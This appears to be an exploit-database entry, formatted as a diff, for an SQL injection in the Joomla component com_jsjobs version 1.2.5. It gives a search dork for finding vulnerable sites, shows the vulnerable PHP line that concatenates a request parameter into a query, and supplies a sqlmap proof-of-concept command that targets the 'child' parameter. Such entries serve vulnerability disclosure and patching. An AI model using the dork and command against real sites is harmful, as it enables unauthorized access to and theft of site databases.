@@ -1,0 +1,23 @@
+#Exploit Title: Joomla! component com_jsjobs - 'customfields.php' SQL Injection
+#Dork: inurl:"index.php?option=com_jsjobs"
+#Date: 13.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://www.joomsky.com/
+#Software Link: https://www.joomsky.com/5/download/1
+#Version: 1.2.5
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+Vulnerable code is in line 171 in file site/models/customfields.php
+
+   169	    function dataForDepandantField( $val , $childfield){ 
+   170	        $db = $this->getDBO();
+   171	        $query = "SELECT userfieldparams,fieldtitle FROM `#__js_job_fieldsordering` WHERE field = '".$childfield."'";	//!!!
+   172	        $db->setQuery($query);
+   173	        $data = $db->loadObject();
+
+#####################################
+#PoC:
+#####################################
+$> sqlmap.py -u "http://localhost/index.php?option=com_jsjobs&task=customfields.datafordepandantfield&fvalue=0&child=0" --random-agent --dbms=mysql --method GET -p child --technique E
